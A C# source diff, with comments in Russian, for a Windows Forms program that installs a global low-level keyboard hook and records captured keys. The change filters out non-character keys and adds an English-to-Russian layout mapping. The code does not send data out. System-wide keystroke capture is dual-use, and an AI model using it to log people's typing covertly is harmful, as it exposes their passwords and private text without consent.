@@ -16,6 +16,11 @@ namespace WindowsFormsApplication1
         private const int WH_KEYBOARD_LL = 13; //ID низкоуровневого перехвата клавиатуры
         private const int WM_KEYDOWN = 0x0100; //сообщение нажатия кнопки
         private static LowLevelKeyboardProc _proc = HookCallback; //делегат колбека
+        private static Keyboard kb = new Keyboard();
+        static string _en = "qwertyuiop[]asdfghjkl;'zxcvbnm,.";
+        static string _ru = "йцукенгшщзхъфывапролджэячсмитьбю";
+        static List<char> alphaEn;
+        static List<char> alphaRu;
         private static IntPtr _hookID = IntPtr.Zero; //ид хука для обращения
 
 
@@ -36,11 +41,28 @@ namespace WindowsFormsApplication1
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 //MessageBox.Show(((Keys)vkCode).ToString()); //prev Console.WriteLine(Keys)vkCode
-                dic.AddKey(((Keys)vkCode).ToString());
+                if (((Keys)vkCode).ToString().Length > 1)
+                {
+                    //nothing
+                }
+                else if (Keyboard.nowLangHand == Keyboard._RUS)
+                {
+                    dic.AddKey( toRus(((Keys)vkCode).ToString().ToLower()) );
+                }
+                else
+                {
+                    dic.AddKey(((Keys)vkCode).ToString().ToLower());
+                }
+                
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
-
+        private static String toRus(string enl)
+        {
+            alphaEn = _en.ToList();
+            alphaRu = _ru.ToList();
+            return alphaRu[alphaEn.IndexOf(Convert.ToChar(enl))].ToString();
+        }
         public void Stop()
         {
             UnhookWindowsHookEx(_hookID);
